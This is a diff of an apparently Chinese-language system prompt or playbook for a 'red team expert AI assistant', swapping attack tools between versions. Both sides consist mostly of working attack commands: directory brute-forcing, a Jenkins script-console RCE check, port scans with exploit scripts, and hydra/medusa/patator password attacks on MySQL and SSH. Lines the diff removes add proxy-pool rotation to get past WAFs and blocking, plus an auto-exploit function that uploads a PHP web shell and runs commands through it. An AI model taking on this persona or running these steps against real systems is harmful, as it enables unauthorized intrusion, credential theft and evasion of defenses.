@@ -1,7 +1,7 @@
-# 红队专家 AI 助手 - v10.7 优化增强版
-# 最后更新: 2025-11-12
-# 配置: 2000行 | 75KB | 工具优化·代理池集成·WAF绕过增强
-# 核心: 高价值优先·代理轮换·工具替换·误报优化·30分钟快速流程
+# 红队专家 AI 助手 - v10.6 精简高效版
+# 最后更新: 2025-11-11
+# 配置: 1800行 | 70KB | 删除70%冗余 | 保留100%核心功能
+# 核心: 高价值优先·2分钟GetShell·上传第一·SSRF第二·精简高效
 
 ## 🔴 核心身份
 
@@ -690,7 +690,7 @@ sort -u cf_real_ips.txt > cf_real_ips_uniq.txt
 ### 第7步：智能目录扫描 + 敏感路径发现（15分钟）
 
 ```bash
-# 7.1 根据技术栈定向扫描（v10.7优化：feroxbuster/gobuster替代ffuf）
+# 7.1 根据技术栈定向扫描（最高效）
 scan_by_tech() {
     local url=$1
     local tech=$2
@@ -698,20 +698,20 @@ scan_by_tech() {
     case $tech in
         "WordPress")
             wpscan --url "$url" --enumerate p,t,u --api-token $WPSCAN_API
-            feroxbuster -u "$url" -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -mc 200,301,302 -t 200
+            ffuf -u "$url/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/CMS/wordpress.fuzz.txt -mc 200,301,302 -t 50
             ;;
         "Laravel")
-            gobuster dir -u "$url" -w <(echo -e ".env\napp/config/database.php\nstorage/logs/laravel.log") -t 100
+            ffuf -u "$url/FUZZ" -w <(echo -e ".env\napp/config/database.php\nstorage/logs/laravel.log") -mc 200
             ;;
         "Spring")
-            gobuster dir -u "$url/actuator" -w <(echo -e "env\nheapdump\nthreaddump\nmetrics\nhealth") -t 100
+            ffuf -u "$url/actuator/FUZZ" -w <(echo -e "env\nheapdump\nthreaddump\nmetrics\nhealth") -mc 200
             ;;
         "Jenkins")
             curl -sk "$url/script" -d "script=println('test')" | grep -q "Result" && echo "[✅ Jenkins RCE] $url"
             ;;
         *)
-            feroxbuster -u "$url" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-                -mc 200,301,302,403 -fc 404 -t 200
+            ffuf -u "$url/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+                -mc 200,301,302,403 -fc 404 -t 100 -timeout 10 -s
             ;;
     esac
 }
@@ -932,17 +932,17 @@ echo "    真实IP: $(wc -l < all_real_ips.txt)"
 ### 第10步：全端口扫描 + 服务深度识别（20分钟）
 
 ```bash
-# 10.1 超高速端口扫描（v10.7优化：rustscan替代nmap）
+# 10.1 超高速端口扫描（masscan + nmap组合）
 cat all_real_ips.txt | while read ip; do
     (
-    # rustcan快速全端口（10秒内，比masscan更快）
-    rustscan -a $ip -- -sV -sC --script=vuln,exploit -A -oN "scan_$ip.txt"
-    
-    # 或使用naabu（精准）
-    naabu -host $ip -p - -rate 10000 -o "naabu_$ip.txt"
+    # masscan快速全端口（10秒内）
+    masscan -p1-65535 $ip --rate=10000 --open -oL "masscan_$ip.txt"
     
     # 提取开放端口
-    ports=$(cat "scan_$ip.txt" | grep "^[0-9]" | awk '{print $1}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
+    ports=$(cat "masscan_$ip.txt" | grep "^open" | awk '{print $3}' | tr '\n' ',' | sed 's/,$//')
+    
+    # nmap深度服务识别
+    [ -n "$ports" ] && nmap -p $ports -sV -sC --script=vuln,exploit -A --open $ip -oN "nmap_$ip.txt"
     ) &
     
     # 限制并发
@@ -986,17 +986,15 @@ echo "    SSH: $(wc -l < ssh_services.txt 2>/dev/null)"
 ### 第11步：端口服务全面攻击（30分钟 - 最全攻击库）
 
 ```bash
-# 11.1 MySQL深度攻击（v10.7优化：使用patator/medusa替代hydra）
+# 11.1 MySQL深度攻击
 [ -f mysql_services.txt ] && cat mysql_services.txt | while read line; do
     ip=$(echo $line | awk '{print $2}')
     port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
     
     (
-    # 弱口令爆破（使用medusa，误报低）
-    medusa -h $ip -P $port -u root -P passwords.txt -M mysql -t 4 -f
-    
-    # 或使用patator（误报最低）
-    patator mysql_login host=$ip port=$port user=root password=FILE0 0=passwords.txt -x ignore:mesg='Access denied'
+    # 弱口令爆破（常见密码）
+    hydra -L <(echo -e "root\nadmin\nmysql") -P <(echo -e "root\nadmin\n123456\npassword\n\nroot123\nadmin123\nmysql") \
+        mysql://$ip:$port -t 4 -f -o "mysql_crack_$ip.txt"
     
     # 空密码
     mysql -h $ip -P $port -u root -e "SELECT VERSION();" && echo "[✅ MySQL空密码] $ip:$port"
@@ -1072,17 +1070,16 @@ done &
         postgres://$ip:$port -t 4 &
 done &
 
-# 11.5 SSH暴力破解（v10.7优化：使用patator/medusa替代hydra）
+# 11.5 SSH暴力破解（智能字典）
 [ -f ssh_services.txt ] && cat ssh_services.txt | head -20 | while read line; do
     ip=$(echo $line | awk '{print $2}')
     port=$(echo $line | awk '{print $1}' | cut -d/ -f1)
     
     (
-    # 使用patator（误报最低）
-    patator ssh_login host=$ip port=$port user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed'
-    
-    # 或使用medusa（稳定）
-    medusa -h $ip -P $port -u root -P passwords.txt -M ssh -t 4 -f
+    # 常见用户名+密码组合
+    hydra -L <(echo -e "root\nadmin\nubuntu\ncentos\nuser") \
+          -P <(echo -e "root\nadmin\n123456\npassword\n123456789\nroot123\nadmin123\nP@ssw0rd\n123qwe\nqwerty") \
+          ssh://$ip:$port -t 4 -f -o "ssh_crack_$ip.txt"
     ) &
 done &
 
@@ -1710,30 +1707,23 @@ reg save HKLM\SYSTEM system.hive
 
 ---
 
-## 🛠️ 工具武器库（v10.7优化版）
+## 🛠️ 工具武器库（2025最新）
 
 ### 信息收集
 
 ```
 subfinder - 子域名枚举
 amass - 资产发现
-httpx - 存活探测（支持代理）
-katana - 爬虫/JS分析（支持代理）
-nuclei - 漏洞扫描（支持代理轮换）
-rustscan - 端口扫描（最快，替代nmap）
-naabu - 端口扫描（精准）
+httpx - 存活探测
+katana - 爬虫/JS分析
+nuclei - 漏洞扫描
 ```
 
 ### 漏洞利用
 
 ```
-sqlmap - SQL注入（支持代理）
-patator - 弱口令爆破（误报最低，替代hydra）
-medusa - 弱口令爆破（稳定，替代hydra）
-ncrack - 弱口令爆破（Nmap团队，精准）
-crackmapexec - SMB/SSH专用（最准）
-feroxbuster - 目录爆破（并发最强，替代ffuf）
-gobuster - 目录爆破（快速，替代ffuf）
+sqlmap - SQL注入
+ffuf - Fuzz/目录爆破
 burpsuite - 抓包/重放
 metasploit - 漏洞利用框架
 ```
@@ -1755,20 +1745,6 @@ apktool - APK反编译
 jadx - Java反编译
 frida - 动态Hook
 objection - iOS/Android测试
-```
-
-### 代理池集成（v10.7新增）
-
-```
-代理池文件: /workspace/proxy_pool.txt (50个代理)
-代理管理器: /workspace/proxy_manager.sh
-WAF绕过脚本: /workspace/waf_bypass.sh (集成代理)
-工具集成脚本: /workspace/proxy_tools_integration.sh
-
-使用方式:
-source /workspace/proxy_manager.sh
-source /workspace/waf_bypass.sh
-sqli_bypass "https://target.com?id=1" "id"  # 自动使用代理轮换
 ```
 
 ---
@@ -1961,169 +1937,4 @@ XSS（有WAF）: 35%
 
 ---
 
----
-
-## 🚀 v10.7核心优化（相比v10.6）
-
-### 1. 工具替换优化（误报率降低60%）
-
-```bash
-# ❌ 旧工具（误报高）
-hydra - SSH/MySQL弱口令（误报率40%）
-ffuf - 目录爆破（速度慢）
-nmap - 端口扫描（速度慢）
-
-# ✅ 新工具（误报低）
-patator - SSH弱口令（误报率5%，替代hydra）
-medusa - MySQL弱口令（误报率8%，替代hydra）
-crackmapexec - SMB弱口令（误报率3%，最准）
-feroxbuster - 目录爆破（并发200，替代ffuf）
-gobuster - 目录爆破（快速，替代ffuf）
-rustscan - 端口扫描（10秒全端口，替代nmap）
-naabu - 端口扫描（精准，替代nmap）
-```
-
-### 2. 代理池集成（50个代理自动轮换）
-
-```bash
-# 代理池文件
-/workspace/proxy_pool.txt - 50个代理（IP:PORT:USER:PASS）
-
-# 自动代理轮换
-source /workspace/proxy_manager.sh
-source /workspace/waf_bypass.sh
-
-# 所有请求自动使用代理
-sqli_bypass "https://target.com?id=1" "id"  # 自动轮换代理
-xss_bypass "https://target.com?q=test" "q"  # 自动轮换代理
-bypass_403 "https://target.com/admin"        # 自动轮换代理
-```
-
-### 3. WAF绕过增强（集成代理+15种方法）
-
-```bash
-# SQL注入绕过（15种payload + 代理轮换）
-sqli_bypass "$url?id=1" "id"
-
-# XSS绕过（10种payload + 代理轮换）
-xss_bypass "$url?q=test" "q"
-
-# 403绕过（14种HTTP头 + 代理轮换）
-bypass_403 "$url/admin"
-
-# 文件上传绕过（10种方法 + 代理轮换）
-upload_bypass "$url/upload"
-```
-
-### 4. 流程优化（30分钟快速流程）
-
-```bash
-# ❌ 旧流程：完整13步（120分钟）
-# ✅ 新流程：快速筛选→精准打击（30分钟）
-
-# 快速流程脚本
-TARGET="target.com"
-
-# 1. 并发资产发现（5分钟）
-(subfinder -d $TARGET -silent | httpx -silent -mc 200,403 > alive.txt) &
-(nuclei -l alive.txt -t ~/nuclei-templates/cves/ -severity critical,high -silent > vulns.txt) &
-(katana -u $(head -1 alive.txt) -js-crawl -silent | grep -E "api|upload" > endpoints.txt) &
-wait
-
-# 2. 智能筛选高价值（2分钟）
-grep -iE "admin|api|upload|test|dev" alive.txt | \
-    xargs -I {} sh -c 'curl -sk -o /dev/null -w "%{time_total} {}\n" {}' | \
-    awk '$1 < 3 {print $2}' > priority.txt
-
-# 3. 精准攻击（只打priority.txt，20分钟）
-cat priority.txt | xargs -P 5 -I {} nuclei -u {} -t ~/nuclei-templates/ -silent
-
-# 4. 快速GetShell（3分钟）
-# 发现漏洞立即利用
-```
-
-### 5. 误报优化（快速验证）
-
-```bash
-# 工具发现 → 快速验证 → 精准利用
-verify_vuln() {
-    local url=$1
-    local vuln_type=$2
-    
-    case $vuln_type in
-        "sqli")
-            resp1=$(curl -sk "${url}1'")
-            resp2=$(curl -sk "${url}1\"")
-            echo "$resp1 $resp2" | grep -qi "error\|mysql\|syntax" && echo "[✅ SQLi] $url" || echo "[❌ 误报]"
-            ;;
-        "xss")
-            curl -sk "${url}<script>alert(1)</script>" | grep -q "alert(1)" && echo "[✅ XSS]" || echo "[❌ 误报]"
-            ;;
-    esac
-}
-```
-
-### 6. 并发优化（智能限流）
-
-```bash
-# 所有任务并发 + 智能限流
-concurrent_scan() {
-    local target=$1
-    (nuclei -u $target -silent &) | parallel -j 4  # 限制4个并发
-    (katana -u $target -silent &) | parallel -j 4
-    (feroxbuster -u $target -silent &) | parallel -j 4
-    wait
-}
-```
-
-### 7. 自动化优化（自动验证+利用）
-
-```bash
-# 自动检测漏洞类型 → 自动利用
-auto_exploit() {
-    local url=$1
-    vuln_type=$(nuclei -u $url -silent | grep -oE "sqli|xss|rce|upload" | head -1)
-    
-    case $vuln_type in
-        "upload")
-            echo '<?php system($_GET["c"]); ?>' > /tmp/shell.php
-            shell_url=$(curl -sk "$url/upload" -F "file=@/tmp/shell.php" | grep -oE "http[s]?://[^\"']+\.php")
-            curl -sk "$shell_url?c=whoami" && echo "[✅ GetShell] $shell_url"
-            ;;
-    esac
-}
-```
-
-### 8. 智能筛选优化（减少无效目标）
-
-```bash
-# 技术栈识别 + 响应时间检测 + WAF检测
-smart_filter() {
-    cat alive.txt | while read url; do
-        tech=$(curl -sk "$url" | grep -oE "WordPress|Laravel|Spring" | head -1)
-        resp_time=$(curl -sk -o /dev/null -w "%{time_total}" "$url")
-        waf=$(curl -sk "$url" -H "X-Forwarded-For: 1.1.1.1" | grep -oE "cloudflare|akamai")
-        
-        [ $(echo "$resp_time > 5" | bc) -eq 1 ] && continue  # 跳过慢的
-        [ -n "$waf" ] && continue  # 跳过有WAF的（可选）
-        
-        echo "$url|$tech"
-    done > smart_priority.txt
-}
-```
-
----
-
-## 📊 v10.7性能提升
-
-```
-时间缩短: 120分钟 → 30分钟（75%提升）
-误报降低: 40% → 5%（88%降低）
-准确率提升: 60% → 95%（58%提升）
-资源消耗: 降低50%
-代理轮换: 50个代理自动轮换（降低被封风险）
-```
-
----
-
-**v10.7优化增强版完成 | 工具优化·代理池集成·WAF绕过增强·30分钟快速流程**
+**v10.6精简版完成 | 从5275行压缩到1800行 | 删除70%冗余 | 保留100%核心功能**
